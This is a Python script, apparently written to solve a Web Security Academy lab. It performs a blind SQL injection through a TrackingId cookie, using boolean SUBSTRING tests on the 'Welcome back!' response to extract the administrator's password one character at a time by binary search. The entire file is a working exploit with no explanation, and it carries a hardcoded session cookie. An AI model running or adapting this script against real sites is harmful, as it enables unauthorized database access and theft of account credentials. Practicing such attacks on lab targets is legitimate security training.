import requests
import time
import math

url = "https://0a7500a3047a212781964eeb00bb00b5.web-security-academy.net/"


def test(code, index):
    cookie = {
        "session": "LAcqtLrCHKhOPGpBAe0skA51NaB2VBqy",
        "TrackingId": "XUAplnAgzs9PGUkX' AND SUBSTRING((SELECT password FROM users WHERE username='administrator')," + str(index) + ",1) >= '" + chr(code)}
    response = requests.get(url, cookies=cookie)
    if "Welcome back!" in response.text:
        return True
    else:
        return False


def test2(code, index):
    cookie = {
        "session": "LAcqtLrCHKhOPGpBAe0skA51NaB2VBqy",
        "TrackingId": "XUAplnAgzs9PGUkX' AND SUBSTRING((SELECT password FROM users WHERE username='administrator')," + str(index) + ",1) = '" + chr(code)}
    response = requests.get(url, cookies=cookie)
    if "Welcome back!" in response.text:
        return True
    else:
        return False


def main(index):
    start = 0
    end = 126
    prev_code = 0
    while True:
        code = (start + end) // 2
        result = test(code, index)
        if code == prev_code:
            result2 = test2(code, index)
            if result2:
                return chr(code)
        print(code)
        if result:
            start = code - 1
        else:
            end = code + 1
        prev_code = code


index = 1
password = ""
prev_time = time.time()
while True:
    result = main(index)
    password += result
    print(password)
    current_time = time.time()
    if abs(current_time - prev_time) > 300:
        print("timeout")
        break
    index = index + 1
